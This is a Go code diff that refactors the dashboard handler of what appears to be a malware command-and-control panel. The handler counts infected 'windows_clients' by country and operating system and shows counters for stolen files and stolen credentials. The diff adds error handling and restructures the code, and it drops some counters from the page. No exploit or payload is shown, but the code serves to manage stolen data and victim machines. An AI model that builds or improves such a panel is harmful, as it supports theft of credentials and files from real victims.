@@ -12,6 +12,7 @@ import (
 	"html/template"
 	"io"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"os"
 	"strconv"
@@ -1308,58 +1309,103 @@ func logoutHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func dashboardHandle(w http.ResponseWriter, r *http.Request) {
-	Username := getUserName(r)
-	if Username != "" {
-		var flag, oS string
-		var us, eu, ru, jp, af, oC, windows, linux, android, other int
-
-		rows, _ := DB.Query("SELECT Flag, OperatingSystem FROM windows_clients")
-		for rows.Next() {
-			_ = rows.Scan(&flag, &oS)
-			if flag == "us" {
-				us++
-			} else if flag == "eu" {
-				eu++
-			} else if flag == "ru" {
-				ru++
-			} else if flag == "jp" {
-				jp++
-			} else if flag == "af" {
-				af++
-			} else {
-				oC++
-			}
-
-			if strings.Contains(oS, "Windows") {
-				windows++
-			} else if strings.Contains(oS, "Linux") {
-				linux++
-			} else if strings.Contains(oS, "Android") {
-				android++
-			} else {
-				other++
-			}
-		}
-
-		debuglog, _ := ioutil.ReadFile("system.log")
-
-		var Notes = GetSpecificSQL("settings", "Value", "Name", "Notes")
-		dash := DashboardPage{Name, Username, strconv.Itoa(ActiveClients), strconv.Itoa(StolenFiles), strconv.Itoa(StolenCredentials), strconv.Itoa(TotalClients), html.UnescapeString(Notes), string(debuglog), strconv.Itoa(us), strconv.Itoa(eu), strconv.Itoa(ru), strconv.Itoa(jp), strconv.Itoa(af), strconv.Itoa(oC), strconv.Itoa(windows), strconv.Itoa(linux), strconv.Itoa(android), strconv.Itoa(other)}
-
-		parsedTemplate, _ := template.ParseFiles("static/dashboard.html")
-		Err := parsedTemplate.Execute(w, dash)
-		if Err != nil {
-			Log.Println("Error executing template :", Err)
-			return
-		}
-	} else {
+	username := getUserName(r)
+	if username == "" {
 		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
-		parsedTemplate, _ := template.ParseFiles("static/login.html")
-		Err := parsedTemplate.Execute(w, login)
-		if Err != nil {
-			Log.Println("Error executing template :", Err)
+		tmpl, err := template.ParseFiles("static/login.html")
+		if err != nil {
+			log.Println("Error parsing login template:", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 			return
 		}
+		if err := tmpl.Execute(w, login); err != nil {
+			log.Println("Error executing login template:", err)
+		}
+		return
+	}
+
+	rows, err := DB.Query("SELECT Flag, OperatingSystem FROM windows_clients")
+	if err != nil {
+		log.Println("DB query error:", err)
+		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+		return
+	}
+	defer rows.Close()
+
+	// Initialisation des compteurs
+	us, eu, ru, jp, af, oC := 0, 0, 0, 0, 0, 0
+	windows, linux, android, other := 0, 0, 0, 0
+
+	for rows.Next() {
+		var flag, oS string
+		err := rows.Scan(&flag, &oS)
+		if err != nil {
+			log.Println("Error scanning row:", err)
+			continue
+		}
+
+		switch flag {
+		case "us":
+			us++
+		case "eu":
+			eu++
+		case "ru":
+			ru++
+		case "jp":
+			jp++
+		case "af":
+			af++
+		default:
+			oC++
+		}
+
+		if strings.Contains(oS, "Windows") {
+			windows++
+		} else if strings.Contains(oS, "Linux") {
+			linux++
+		} else if strings.Contains(oS, "Android") {
+			android++
+		} else {
+			other++
+		}
+	}
+
+	debuglog, err := ioutil.ReadFile("system.log")
+	if err != nil {
+		log.Println("Error reading system.log:", err)
+		debuglog = []byte("")
+	}
+
+	//notes := GetSpecificSQL("settings", "Value", "Name", "Notes")
+
+	dash := DashboardPage{
+		Name:              Name,
+		Username:          username,
+		ActiveClients:     strconv.Itoa(ActiveClients),
+		StolenFiles:       strconv.Itoa(StolenFiles),
+		StolenCredentials: strconv.Itoa(StolenCredentials),
+		TotalClients:      strconv.Itoa(TotalClients),
+		//Notes:             html.UnescapeString(notes),
+		DebugLog: string(debuglog),
+		USA:      strconv.Itoa(us),
+		EU:       strconv.Itoa(eu),
+		RU:       strconv.Itoa(ru),
+		JP:       strconv.Itoa(jp),
+		AF:       strconv.Itoa(af),
+		Windows:  strconv.Itoa(windows),
+		Linux:    strconv.Itoa(linux),
+		Android:  strconv.Itoa(android),
+	}
+
+	tmpl, err := template.ParseFiles("static/dashboard.html")
+	if err != nil {
+		log.Println("Error parsing dashboard template:", err)
+		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+		return
+	}
+
+	if err := tmpl.Execute(w, dash); err != nil {
+		log.Println("Error executing dashboard template:", err)
 	}
 }
 
